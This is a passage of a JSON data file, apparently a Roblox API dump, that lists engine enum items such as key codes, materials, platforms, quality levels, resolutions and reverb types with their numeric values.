"Name":"World60","tags":[],"Value":220,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World61","tags":[],"Value":221,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World62","tags":[],"Value":222,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World63","tags":[],"Value":223,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World64","tags":[],"Value":224,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World65","tags":[],"Value":225,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World66","tags":[],"Value":226,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World67","tags":[],"Value":227,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World68","tags":[],"Value":228,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World69","tags":[],"Value":229,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World70","tags":[],"Value":230,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World71","tags":[],"Value":231,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World72","tags":[],"Value":232,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World73","tags":[],"Value":233,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World74","tags":[],"Value":234,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World75","tags":[],"Value":235,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World76","tags":[],"Value":236,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World77","tags":[],"Value":237,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World78","tags":[],"Value":238,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World79","tags":[],"Value":239,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World80","tags":[],"Value":240,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World81","tags":[],"Value":241,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World82","tags":[],"Value":242,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World83","tags":[],"Value":243,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World84","tags":[],"Value":244,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World85","tags":[],"Value":245,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World86","tags":[],"Value":246,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World87","tags":[],"Value":247,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World88","tags":[],"Value":248,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World89","tags":[],"Value":249,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World90","tags":[],"Value":250,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World91","tags":[],"Value":251,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World92","tags":[],"Value":252,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World93","tags":[],"Value":253,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World94","tags":[],"Value":254,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World95","tags":[],"Value":255,"Enum":"KeyCode"},{"type":"EnumItem","Name":"ButtonX","tags":[],"Value":1000,"Enum":"KeyCode"},{"type":"EnumItem","Name":"ButtonY","tags":[],"Value":1001,"Enum":"KeyCode"},{"type":"EnumItem","Name":"ButtonA","tags":[],"Value":1002,"Enum":"KeyCode"},{"type":"EnumItem","Name":"ButtonB","tags":[],"Value":1003,"Enum":"KeyCode"},{"type":"EnumItem","Name":"ButtonR1","tags":[],"Value":1004,"Enum":"KeyCode"},{"type":"EnumItem","Name":"ButtonL1","tags":[],"Value":1005,"Enum":"KeyCode"},{"type":"EnumItem","Name":"ButtonR2","tags":[],"Value":1006,"Enum":"KeyCode"},{"type":"EnumItem","Name":"ButtonL2","tags":[],"Value":1007,"Enum":"KeyCode"},{"type":"EnumItem","Name":"ButtonR3","tags":[],"Value":1008,"Enum":"KeyCode"},{"type":"EnumItem","Name":"ButtonL3","tags":[],"Value":1009,"Enum":"KeyCode"},{"type":"EnumItem","Name":"ButtonStart","tags":[],"Value":1010,"Enum":"KeyCode"},{"type":"EnumItem","Name":"ButtonSelect","tags":[],"Value":1011,"Enum":"KeyCode"},{"type":"EnumItem","Name":"DPadLeft","tags":[],"Value":1012,"Enum":"KeyCode"},{"type":"EnumItem","Name":"DPadRight","tags":[],"Value":1013,"Enum":"KeyCode"},{"type":"EnumItem","Name":"DPadUp","tags":[],"Value":1014,"Enum":"KeyCode"},{"type":"EnumItem","Name":"DPadDown","tags":[],"Value":1015,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Thumbstick1","tags":[],"Value":1016,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Thumbstick2","tags":[],"Value":1017,"Enum":"KeyCode"},{"type":"Enum","Name":"KeywordFilterType","tags":[]},{"type":"EnumItem","Name":"Include","tags":[],"Value":0,"Enum":"KeywordFilterType"},{"type":"EnumItem","Name":"Exclude","tags":[],"Value":1,"Enum":"KeywordFilterType"},{"type":"Enum","Name":"Language","tags":[]},{"type":"EnumItem","Name":"Default","tags":[],"Value":0,"Enum":"Language"},{"type":"Enum","Name":"LeftRight","tags":[]},{"type":"EnumItem","Name":"Left","tags":[],"Value":0,"Enum":"LeftRight"},{"type":"EnumItem","Name":"Center","tags":[],"Value":1,"Enum":"LeftRight"},{"type":"EnumItem","Name":"Right","tags":[],"Value":2,"Enum":"LeftRight"},{"type":"Enum","Name":"LevelOfDetailSetting","tags":[]},{"type":"EnumItem","Name":"High","tags":[],"Value":2,"Enum":"LevelOfDetailSetting"},{"type":"EnumItem","Name":"Medium","tags":[],"Value":1,"Enum":"LevelOfDetailSetting"},{"type":"EnumItem","Name":"Low","tags":[],"Value":0,"Enum":"LevelOfDetailSetting"},{"type":"Enum","Name":"Limb","tags":[]},{"type":"EnumItem","Name":"Head","tags":[],"Value":0,"Enum":"Limb"},{"type":"EnumItem","Name":"Torso","tags":[],"Value":1,"Enum":"Limb"},{"type":"EnumItem","Name":"LeftArm","tags":[],"Value":2,"Enum":"Limb"},{"type":"EnumItem","Name":"RightArm","tags":[],"Value":3,"Enum":"Limb"},{"type":"EnumItem","Name":"LeftLeg","tags":[],"Value":4,"Enum":"Limb"},{"type":"EnumItem","Name":"RightLeg","tags":[],"Value":5,"Enum":"Limb"},{"type":"EnumItem","Name":"Unknown","tags":[],"Value":6,"Enum":"Limb"},{"type":"Enum","Name":"ListenerType","tags":[]},{"type":"EnumItem","Name":"Camera","tags":[],"Value":0,"Enum":"ListenerType"},{"type":"EnumItem","Name":"CFrame","tags":[],"Value":1,"Enum":"ListenerType"},{"type":"EnumItem","Name":"ObjectPosition","tags":[],"Value":2,"Enum":"ListenerType"},{"type":"EnumItem","Name":"ObjectCFrame","tags":[],"Value":3,"Enum":"ListenerType"},{"type":"Enum","Name":"Material","tags":[]},{"type":"EnumItem","Name":"Plastic","tags":[],"Value":256,"Enum":"Material"},{"type":"EnumItem","Name":"Wood","tags":[],"Value":512,"Enum":"Material"},{"type":"EnumItem","Name":"Slate","tags":[],"Value":800,"Enum":"Material"},{"type":"EnumItem","Name":"Concrete","tags":[],"Value":816,"Enum":"Material"},{"type":"EnumItem","Name":"CorrodedMetal","tags":[],"Value":1040,"Enum":"Material"},{"type":"EnumItem","Name":"DiamondPlate","tags":[],"Value":1056,"Enum":"Material"},{"type":"EnumItem","Name":"Foil","tags":[],"Value":1072,"Enum":"Material"},{"type":"EnumItem","Name":"Grass","tags":[],"Value":1280,"Enum":"Material"},{"type":"EnumItem","Name":"Ice","tags":[],"Value":1536,"Enum":"Material"},{"type":"EnumItem","Name":"Marble","tags":[],"Value":784,"Enum":"Material"},{"type":"EnumItem","Name":"Granite","tags":[],"Value":832,"Enum":"Material"},{"type":"EnumItem","Name":"Brick","tags":[],"Value":848,"Enum":"Material"},{"type":"EnumItem","Name":"Pebble","tags":[],"Value":864,"Enum":"Material"},{"type":"EnumItem","Name":"Sand","tags":[],"Value":1296,"Enum":"Material"},{"type":"EnumItem","Name":"Fabric","tags":[],"Value":1312,"Enum":"Material"},{"type":"EnumItem","Name":"SmoothPlastic","tags":[],"Value":272,"Enum":"Material"},{"type":"EnumItem","Name":"Metal","tags":[],"Value":1088,"Enum":"Material"},{"type":"EnumItem","Name":"WoodPlanks","tags":[],"Value":528,"Enum":"Material"},{"type":"EnumItem","Name":"Cobblestone","tags":[],"Value":880,"Enum":"Material"},{"type":"EnumItem","Name":"Air","tags":["notbrowsable"],"Value":1792,"Enum":"Material"},{"type":"EnumItem","Name":"Water","tags":["notbrowsable"],"Value":2048,"Enum":"Material"},{"type":"EnumItem","Name":"Rock","tags":["notbrowsable"],"Value":896,"Enum":"Material"},{"type":"EnumItem","Name":"Glacier","tags":["notbrowsable"],"Value":1552,"Enum":"Material"},{"type":"EnumItem","Name":"Snow","tags":["notbrowsable"],"Value":1328,"Enum":"Material"},{"type":"EnumItem","Name":"Sandstone","tags":["notbrowsable"],"Value":912,"Enum":"Material"},{"type":"EnumItem","Name":"Mud","tags":["notbrowsable"],"Value":1344,"Enum":"Material"},{"type":"EnumItem","Name":"Basalt","tags":["notbrowsable"],"Value":788,"Enum":"Material"},{"type":"EnumItem","Name":"Ground","tags":["notbrowsable"],"Value":1360,"Enum":"Material"},{"type":"EnumItem","Name":"CrackedLava","tags":["notbrowsable"],"Value":804,"Enum":"Material"},{"type":"EnumItem","Name":"Neon","tags":[],"Value":288,"Enum":"Material"},{"type":"EnumItem","Name":"Asphalt","tags":["notbrowsable"],"Value":1376,"Enum":"Material"},{"type":"EnumItem","Name":"LeafyGrass","tags":["notbrowsable"],"Value":1284,"Enum":"Material"},{"type":"EnumItem","Name":"Salt","tags":["notbrowsable"],"Value":1392,"Enum":"Material"},{"type":"EnumItem","Name":"Limestone","tags":["notbrowsable"],"Value":820,"Enum":"Material"},{"type":"EnumItem","Name":"Pavement","tags":["notbrowsable"],"Value":836,"Enum":"Material"},{"type":"Enum","Name":"MembershipType","tags":[]},{"type":"EnumItem","Name":"None","tags":[],"Value":0,"Enum":"MembershipType"},{"type":"EnumItem","Name":"BuildersClub","tags":[],"Value":1,"Enum":"MembershipType"},{"type":"EnumItem","Name":"TurboBuildersClub","tags":[],"Value":2,"Enum":"MembershipType"},{"type":"EnumItem","Name":"OutrageousBuildersClub","tags":[],"Value":3,"Enum":"MembershipType"},{"type":"Enum","Name":"MeshType","tags":[]},{"type":"EnumItem","Name":"Head","tags":[],"Value":0,"Enum":"MeshType"},{"type":"EnumItem","Name":"Torso","tags":[],"Value":1,"Enum":"MeshType"},{"type":"EnumItem","Name":"Wedge","tags":[],"Value":2,"Enum":"MeshType"},{"type":"EnumItem","Name":"Prism","tags":["deprecated"],"Value":7,"Enum":"MeshType"},{"type":"EnumItem","Name":"Pyramid","tags":["deprecated"],"Value":8,"Enum":"MeshType"},{"type":"EnumItem","Name":"ParallelRamp","tags":["deprecated"],"Value":9,"Enum":"MeshType"},{"type":"EnumItem","Name":"RightAngleRamp","tags":["deprecated"],"Value":10,"Enum":"MeshType"},{"type":"EnumItem","Name":"CornerWedge","tags":["deprecated"],"Value":11,"Enum":"MeshType"},{"type":"EnumItem","Name":"Brick","tags":[],"Value":6,"Enum":"MeshType"},{"type":"EnumItem","Name":"Sphere","tags":[],"Value":3,"Enum":"MeshType"},{"type":"EnumItem","Name":"Cylinder","tags":[],"Value":4,"Enum":"MeshType"},{"type":"EnumItem","Name":"FileMesh","tags":[],"Value":5,"Enum":"MeshType"},{"type":"Enum","Name":"MessageType","tags":[]},{"type":"EnumItem","Name":"MessageOutput","tags":[],"Value":0,"Enum":"MessageType"},{"type":"EnumItem","Name":"MessageInfo","tags":[],"Value":1,"Enum":"MessageType"},{"type":"EnumItem","Name":"MessageWarning","tags":[],"Value":2,"Enum":"MessageType"},{"type":"EnumItem","Name":"MessageError","tags":[],"Value":3,"Enum":"MessageType"},{"type":"Enum","Name":"MouseBehavior","tags":[]},{"type":"EnumItem","Name":"Default","tags":[],"Value":0,"Enum":"MouseBehavior"},{"type":"EnumItem","Name":"LockCenter","tags":[],"Value":1,"Enum":"MouseBehavior"},{"type":"EnumItem","Name":"LockCurrentPosition","tags":[],"Value":2,"Enum":"MouseBehavior"},{"type":"Enum","Name":"MoveState","tags":[]},{"type":"EnumItem","Name":"Stopped","tags":[],"Value":0,"Enum":"MoveState"},{"type":"EnumItem","Name":"Coasting","tags":[],"Value":1,"Enum":"MoveState"},{"type":"EnumItem","Name":"Pushing","tags":[],"Value":2,"Enum":"MoveState"},{"type":"EnumItem","Name":"Stopping","tags":[],"Value":3,"Enum":"MoveState"},{"type":"EnumItem","Name":"AirFree","tags":[],"Value":4,"Enum":"MoveState"},{"type":"Enum","Name":"NameOcclusion","tags":[]},{"type":"EnumItem","Name":"OccludeAll","tags":[],"Value":2,"Enum":"NameOcclusion"},{"type":"EnumItem","Name":"EnemyOcclusion","tags":[],"Value":1,"Enum":"NameOcclusion"},{"type":"EnumItem","Name":"NoOcclusion","tags":[],"Value":0,"Enum":"NameOcclusion"},{"type":"Enum","Name":"NetworkOwnership","tags":[]},{"type":"EnumItem","Name":"Automatic","tags":[],"Value":0,"Enum":"NetworkOwnership"},{"type":"EnumItem","Name":"Manual","tags":[],"Value":1,"Enum":"NetworkOwnership"},{"type":"EnumItem","Name":"OnContact","tags":[],"Value":2,"Enum":"NetworkOwnership"},{"type":"Enum","Name":"NormalId","tags":[]},{"type":"EnumItem","Name":"Top","tags":[],"Value":1,"Enum":"NormalId"},{"type":"EnumItem","Name":"Bottom","tags":[],"Value":4,"Enum":"NormalId"},{"type":"EnumItem","Name":"Back","tags":[],"Value":2,"Enum":"NormalId"},{"type":"EnumItem","Name":"Front","tags":[],"Value":5,"Enum":"NormalId"},{"type":"EnumItem","Name":"Right","tags":[],"Value":0,"Enum":"NormalId"},{"type":"EnumItem","Name":"Left","tags":[],"Value":3,"Enum":"NormalId"},{"type":"Enum","Name":"OverrideMouseIconBehavior","tags":[]},{"type":"EnumItem","Name":"None","tags":[],"Value":0,"Enum":"OverrideMouseIconBehavior"},{"type":"EnumItem","Name":"ForceShow","tags":[],"Value":1,"Enum":"OverrideMouseIconBehavior"},{"type":"EnumItem","Name":"ForceHide","tags":[],"Value":2,"Enum":"OverrideMouseIconBehavior"},{"type":"Enum","Name":"PacketPriority","tags":[]},{"type":"EnumItem","Name":"IMMEDIATE_PRIORITY","tags":[],"Value":0,"Enum":"PacketPriority"},{"type":"EnumItem","Name":"HIGH_PRIORITY","tags":[],"Value":1,"Enum":"PacketPriority"},{"type":"EnumItem","Name":"MEDIUM_PRIORITY","tags":[],"Value":2,"Enum":"PacketPriority"},{"type":"EnumItem","Name":"LOW_PRIORITY","tags":[],"Value":3,"Enum":"PacketPriority"},{"type":"Enum","Name":"PacketReliability","tags":[]},{"type":"EnumItem","Name":"UNRELIABLE","tags":[],"Value":0,"Enum":"PacketReliability"},{"type":"EnumItem","Name":"UNRELIABLE_SEQUENCED","tags":[],"Value":1,"Enum":"PacketReliability"},{"type":"EnumItem","Name":"RELIABLE","tags":[],"Value":2,"Enum":"PacketReliability"},{"type":"EnumItem","Name":"RELIABLE_ORDERED","tags":[],"Value":3,"Enum":"PacketReliability"},{"type":"EnumItem","Name":"RELIABLE_SEQUENCED","tags":[],"Value":4,"Enum":"PacketReliability"},{"type":"Enum","Name":"PartType","tags":[]},{"type":"EnumItem","Name":"Ball","tags":[],"Value":0,"Enum":"PartType"},{"type":"EnumItem","Name":"Block","tags":[],"Value":1,"Enum":"PartType"},{"type":"EnumItem","Name":"Cylinder","tags":[],"Value":2,"Enum":"PartType"},{"type":"Enum","Name":"PathStatus","tags":[]},{"type":"EnumItem","Name":"Success","tags":[],"Value":0,"Enum":"PathStatus"},{"type":"EnumItem","Name":"ClosestNoPath","tags":["deprecated"],"Value":1,"Enum":"PathStatus"},{"type":"EnumItem","Name":"ClosestOutOfRange","tags":["deprecated"],"Value":2,"Enum":"PathStatus"},{"type":"EnumItem","Name":"FailStartNotEmpty","tags":["deprecated"],"Value":3,"Enum":"PathStatus"},{"type":"EnumItem","Name":"FailFinishNotEmpty","tags":["deprecated"],"Value":4,"Enum":"PathStatus"},{"type":"EnumItem","Name":"NoPath","tags":[],"Value":5,"Enum":"PathStatus"},{"type":"Enum","Name":"PathWaypointAction","tags":[]},{"type":"EnumItem","Name":"Walk","tags":[],"Value":0,"Enum":"PathWaypointAction"},{"type":"EnumItem","Name":"Jump","tags":[],"Value":1,"Enum":"PathWaypointAction"},{"type":"Enum","Name":"PhysicsReceiveMethod","tags":[]},{"type":"EnumItem","Name":"Direct","tags":[],"Value":0,"Enum":"PhysicsReceiveMethod"},{"type":"EnumItem","Name":"Interpolation","tags":[],"Value":1,"Enum":"PhysicsReceiveMethod"},{"type":"Enum","Name":"PhysicsSendMethod","tags":[]},{"type":"EnumItem","Name":"ErrorComputation","tags":[],"Value":0,"Enum":"PhysicsSendMethod"},{"type":"EnumItem","Name":"ErrorComputation2","tags":[],"Value":1,"Enum":"PhysicsSendMethod"},{"type":"EnumItem","Name":"RoundRobin","tags":[],"Value":2,"Enum":"PhysicsSendMethod"},{"type":"EnumItem","Name":"TopNErrors","tags":[],"Value":3,"Enum":"PhysicsSendMethod"},{"type":"Enum","Name":"Platform","tags":[]},{"type":"EnumItem","Name":"Windows","tags":[],"Value":0,"Enum":"Platform"},{"type":"EnumItem","Name":"OSX","tags":[],"Value":1,"Enum":"Platform"},{"type":"EnumItem","Name":"IOS","tags":[],"Value":2,"Enum":"Platform"},{"type":"EnumItem","Name":"Android","tags":[],"Value":3,"Enum":"Platform"},{"type":"EnumItem","Name":"XBoxOne","tags":[],"Value":4,"Enum":"Platform"},{"type":"EnumItem","Name":"PS4","tags":[],"Value":5,"Enum":"Platform"},{"type":"EnumItem","Name":"PS3","tags":[],"Value":6,"Enum":"Platform"},{"type":"EnumItem","Name":"XBox360","tags":[],"Value":7,"Enum":"Platform"},{"type":"EnumItem","Name":"WiiU","tags":[],"Value":8,"Enum":"Platform"},{"type":"EnumItem","Name":"NX","tags":[],"Value":9,"Enum":"Platform"},{"type":"EnumItem","Name":"Ouya","tags":[],"Value":10,"Enum":"Platform"},{"type":"EnumItem","Name":"AndroidTV","tags":[],"Value":11,"Enum":"Platform"},{"type":"EnumItem","Name":"Chromecast","tags":[],"Value":12,"Enum":"Platform"},{"type":"EnumItem","Name":"Linux","tags":[],"Value":13,"Enum":"Platform"},{"type":"EnumItem","Name":"SteamOS","tags":[],"Value":14,"Enum":"Platform"},{"type":"EnumItem","Name":"WebOS","tags":[],"Value":15,"Enum":"Platform"},{"type":"EnumItem","Name":"DOS","tags":[],"Value":16,"Enum":"Platform"},{"type":"EnumItem","Name":"BeOS","tags":[],"Value":17,"Enum":"Platform"},{"type":"EnumItem","Name":"UWP","tags":[],"Value":18,"Enum":"Platform"},{"type":"EnumItem","Name":"None","tags":[],"Value":19,"Enum":"Platform"},{"type":"Enum","Name":"PlaybackState","tags":[]},{"type":"EnumItem","Name":"Begin","tags":[],"Value":0,"Enum":"PlaybackState"},{"type":"EnumItem","Name":"Delayed","tags":[],"Value":1,"Enum":"PlaybackState"},{"type":"EnumItem","Name":"Playing","tags":[],"Value":2,"Enum":"PlaybackState"},{"type":"EnumItem","Name":"Paused","tags":[],"Value":3,"Enum":"PlaybackState"},{"type":"EnumItem","Name":"Completed","tags":[],"Value":4,"Enum":"PlaybackState"},{"type":"EnumItem","Name":"Cancelled","tags":[],"Value":5,"Enum":"PlaybackState"},{"type":"Enum","Name":"PlayerActions","tags":[]},{"type":"EnumItem","Name":"CharacterForward","tags":[],"Value":0,"Enum":"PlayerActions"},{"type":"EnumItem","Name":"CharacterBackward","tags":[],"Value":1,"Enum":"PlayerActions"},{"type":"EnumItem","Name":"CharacterLeft","tags":[],"Value":2,"Enum":"PlayerActions"},{"type":"EnumItem","Name":"CharacterRight","tags":[],"Value":3,"Enum":"PlayerActions"},{"type":"EnumItem","Name":"CharacterJump","tags":[],"Value":4,"Enum":"PlayerActions"},{"type":"Enum","Name":"PlayerChatType","tags":[]},{"type":"EnumItem","Name":"All","tags":[],"Value":0,"Enum":"PlayerChatType"},{"type":"EnumItem","Name":"Team","tags":[],"Value":1,"Enum":"PlayerChatType"},{"type":"EnumItem","Name":"Whisper","tags":[],"Value":2,"Enum":"PlayerChatType"},{"type":"Enum","Name":"PoseEasingDirection","tags":[]},{"type":"EnumItem","Name":"Out","tags":[],"Value":1,"Enum":"PoseEasingDirection"},{"type":"EnumItem","Name":"InOut","tags":[],"Value":2,"Enum":"PoseEasingDirection"},{"type":"EnumItem","Name":"In","tags":[],"Value":0,"Enum":"PoseEasingDirection"},{"type":"Enum","Name":"PoseEasingStyle","tags":[]},{"type":"EnumItem","Name":"Linear","tags":[],"Value":0,"Enum":"PoseEasingStyle"},{"type":"EnumItem","Name":"Constant","tags":[],"Value":1,"Enum":"PoseEasingStyle"},{"type":"EnumItem","Name":"Elastic","tags":[],"Value":2,"Enum":"PoseEasingStyle"},{"type":"EnumItem","Name":"Cubic","tags":[],"Value":3,"Enum":"PoseEasingStyle"},{"type":"EnumItem","Name":"Bounce","tags":[],"Value":4,"Enum":"PoseEasingStyle"},{"type":"Enum","Name":"PriorityMethod","tags":[]},{"type":"EnumItem","Name":"LastError","tags":[],"Value":0,"Enum":"PriorityMethod"},{"type":"EnumItem","Name":"AccumulatedError","tags":[],"Value":1,"Enum":"PriorityMethod"},{"type":"EnumItem","Name":"FIFO","tags":[],"Value":2,"Enum":"PriorityMethod"},{"type":"Enum","Name":"PrismSides","tags":[]},{"type":"EnumItem","Name":"3","tags":[],"Value":3,"Enum":"PrismSides"},{"type":"EnumItem","Name":"5","tags":[],"Value":5,"Enum":"PrismSides"},{"type":"EnumItem","Name":"6","tags":[],"Value":6,"Enum":"PrismSides"},{"type":"EnumItem","Name":"8","tags":[],"Value":8,"Enum":"PrismSides"},{"type":"EnumItem","Name":"10","tags":[],"Value":10,"Enum":"PrismSides"},{"type":"EnumItem","Name":"20","tags":[],"Value":20,"Enum":"PrismSides"},{"type":"Enum","Name":"PrivilegeType","tags":[]},{"type":"EnumItem","Name":"Owner","tags":[],"Value":255,"Enum":"PrivilegeType"},{"type":"EnumItem","Name":"Admin","tags":[],"Value":240,"Enum":"PrivilegeType"},{"type":"EnumItem","Name":"Member","tags":[],"Value":128,"Enum":"PrivilegeType"},{"type":"EnumItem","Name":"Visitor","tags":[],"Value":10,"Enum":"PrivilegeType"},{"type":"EnumItem","Name":"Banned","tags":[],"Value":0,"Enum":"PrivilegeType"},{"type":"Enum","Name":"ProductPurchaseDecision","tags":[]},{"type":"EnumItem","Name":"NotProcessedYet","tags":[],"Value":0,"Enum":"ProductPurchaseDecision"},{"type":"EnumItem","Name":"PurchaseGranted","tags":[],"Value":1,"Enum":"ProductPurchaseDecision"},{"type":"Enum","Name":"PyramidSides","tags":[]},{"type":"EnumItem","Name":"3","tags":[],"Value":3,"Enum":"PyramidSides"},{"type":"EnumItem","Name":"4","tags":[],"Value":4,"Enum":"PyramidSides"},{"type":"EnumItem","Name":"5","tags":[],"Value":5,"Enum":"PyramidSides"},{"type":"EnumItem","Name":"6","tags":[],"Value":6,"Enum":"PyramidSides"},{"type":"EnumItem","Name":"8","tags":[],"Value":8,"Enum":"PyramidSides"},{"type":"EnumItem","Name":"10","tags":[],"Value":10,"Enum":"PyramidSides"},{"type":"EnumItem","Name":"20","tags":[],"Value":20,"Enum":"PyramidSides"},{"type":"Enum","Name":"QualityLevel","tags":[]},{"type":"EnumItem","Name":"Automatic","tags":[],"Value":0,"Enum":"QualityLevel"},{"type":"EnumItem","Name":"Level01","tags":[],"Value":1,"Enum":"QualityLevel"},{"type":"EnumItem","Name":"Level02","tags":[],"Value":2,"Enum":"QualityLevel"},{"type":"EnumItem","Name":"Level03","tags":[],"Value":3,"Enum":"QualityLevel"},{"type":"EnumItem","Name":"Level04","tags":[],"Value":4,"Enum":"QualityLevel"},{"type":"EnumItem","Name":"Level05","tags":[],"Value":5,"Enum":"QualityLevel"},{"type":"EnumItem","Name":"Level06","tags":[],"Value":6,"Enum":"QualityLevel"},{"type":"EnumItem","Name":"Level07","tags":[],"Value":7,"Enum":"QualityLevel"},{"type":"EnumItem","Name":"Level08","tags":[],"Value":8,"Enum":"QualityLevel"},{"type":"EnumItem","Name":"Level09","tags":[],"Value":9,"Enum":"QualityLevel"},{"type":"EnumItem","Name":"Level10","tags":[],"Value":10,"Enum":"QualityLevel"},{"type":"EnumItem","Name":"Level11","tags":[],"Value":11,"Enum":"QualityLevel"},{"type":"EnumItem","Name":"Level12","tags":[],"Value":12,"Enum":"QualityLevel"},{"type":"EnumItem","Name":"Level13","tags":[],"Value":13,"Enum":"QualityLevel"},{"type":"EnumItem","Name":"Level14","tags":[],"Value":14,"Enum":"QualityLevel"},{"type":"EnumItem","Name":"Level15","tags":[],"Value":15,"Enum":"QualityLevel"},{"type":"EnumItem","Name":"Level16","tags":[],"Value":16,"Enum":"QualityLevel"},{"type":"EnumItem","Name":"Level17","tags":[],"Value":17,"Enum":"QualityLevel"},{"type":"EnumItem","Name":"Level18","tags":[],"Value":18,"Enum":"QualityLevel"},{"type":"EnumItem","Name":"Level19","tags":[],"Value":19,"Enum":"QualityLevel"},{"type":"EnumItem","Name":"Level20","tags":[],"Value":20,"Enum":"QualityLevel"},{"type":"EnumItem","Name":"Level21","tags":[],"Value":21,"Enum":"QualityLevel"},{"type":"Enum","Name":"R15CollisionType","tags":[]},{"type":"EnumItem","Name":"OuterBox","tags":[],"Value":0,"Enum":"R15CollisionType"},{"type":"EnumItem","Name":"InnerBox","tags":[],"Value":1,"Enum":"R15CollisionType"},{"type":"Enum","Name":"RenderPriority","tags":[]},{"type":"EnumItem","Name":"First","tags":[],"Value":0,"Enum":"RenderPriority"},{"type":"EnumItem","Name":"Input","tags":[],"Value":100,"Enum":"RenderPriority"},{"type":"EnumItem","Name":"Camera","tags":[],"Value":200,"Enum":"RenderPriority"},{"type":"EnumItem","Name":"Character","tags":[],"Value":300,"Enum":"RenderPriority"},{"type":"EnumItem","Name":"Last","tags":[],"Value":2000,"Enum":"RenderPriority"},{"type":"Enum","Name":"Resolution","tags":[]},{"type":"EnumItem","Name":"Automatic","tags":[],"Value":0,"Enum":"Resolution"},{"type":"EnumItem","Name":"720x526","tags":[],"Value":1,"Enum":"Resolution"},{"type":"EnumItem","Name":"800x600","tags":[],"Value":2,"Enum":"Resolution"},{"type":"EnumItem","Name":"1024x600","tags":[],"Value":3,"Enum":"Resolution"},{"type":"EnumItem","Name":"1024x768","tags":[],"Value":4,"Enum":"Resolution"},{"type":"EnumItem","Name":"1280x720","tags":[],"Value":5,"Enum":"Resolution"},{"type":"EnumItem","Name":"1280x768","tags":[],"Value":6,"Enum":"Resolution"},{"type":"EnumItem","Name":"1152x864","tags":[],"Value":7,"Enum":"Resolution"},{"type":"EnumItem","Name":"1280x800","tags":[],"Value":8,"Enum":"Resolution"},{"type":"EnumItem","Name":"1360x768","tags":[],"Value":9,"Enum":"Resolution"},{"type":"EnumItem","Name":"1280x960","tags":[],"Value":10,"Enum":"Resolution"},{"type":"EnumItem","Name":"1280x1024","tags":[],"Value":11,"Enum":"Resolution"},{"type":"EnumItem","Name":"1440x900","tags":[],"Value":12,"Enum":"Resolution"},{"type":"EnumItem","Name":"1600x900","tags":[],"Value":13,"Enum":"Resolution"},{"type":"EnumItem","Name":"1600x1024","tags":[],"Value":14,"Enum":"Resolution"},{"type":"EnumItem","Name":"1600x1200","tags":[],"Value":15,"Enum":"Resolution"},{"type":"EnumItem","Name":"1680x1050","tags":[],"Value":16,"Enum":"Resolution"},{"type":"EnumItem","Name":"1920x1080","tags":[],"Value":17,"Enum":"Resolution"},{"type":"EnumItem","Name":"1920x1200","tags":[],"Value":18,"Enum":"Resolution"},{"type":"Enum","Name":"ReverbType","tags":[]},{"type":"EnumItem","Name":"NoReverb","tags":[],"Value":0,"Enum":"ReverbType"},{"type":"EnumItem","Name":"GenericReverb","tags":[],"Value":1,"Enum":"ReverbType"},{"type":"EnumItem","Name":"PaddedCell","tags":[],"Value":2,"Enum":"ReverbType"},{"type":"EnumItem","Name":"Room","tags":[],"Value":3,"Enum":"ReverbType"},{"type":"EnumItem","Name":"Bathroom","tags":[],"Value":4,"Enum":"ReverbType"},{"type":"EnumItem","Name":"LivingRoom","tags":[],"Value":5,"Enum":"ReverbType"},{"type":"EnumItem","Name":"StoneRoom","tags":[],"Value":6,"Enum":"ReverbType"},{"type":"EnumItem","Name":"Auditorium","tags":[],"Value":7,"Enum":"ReverbType"},{"type":"EnumItem","Name":"ConcertHall","tags":[],"Value":8,"Enum":"ReverbType"},{"type":"EnumItem","Name":"Cave","tags":[],"Value":9,"Enum":"ReverbType"},{"type":"EnumItem","Name":"Arena","tags":[],"Value":10,"Enum":"ReverbType"},{"type":"EnumItem","Name":"Hangar","tags":[],"Value":11,"Enum":"ReverbType"},{"type":"EnumItem","Name":"CarpettedHallway","tags":[],"Value":12,"Enum":"ReverbType"},{"type":"EnumItem","Name":"Hallway","tags":[],"Value":13,"Enum":"ReverbType"},{"type":"EnumItem","Name":"StoneCorridor","tags":[],"Value":14,"Enum":"ReverbType"},{"type":"EnumItem","Name":"Alley","tags":[],"Value":15,"Enum":"ReverbType"},{"type":"EnumItem","Name":"Forest","tags":[],"Value":16,"Enum":"ReverbType"},{"type":"EnumItem","Name":"City","tags":[],"Value":17,"Enum":"ReverbType"},{"type":"EnumItem","Name":"Mountains","tags":[],"Value":18,"Enum":"ReverbType"},{"type":"EnumItem","Name":"Quarry","tags":[],"Value":19,"Enum":"ReverbType"},{"type":"EnumItem","Name":"Plain","tags":[],"Value":20,"Enum":"ReverbType"},{"type":"EnumItem","Name":"ParkingLot","tags":[],"Value":21,"En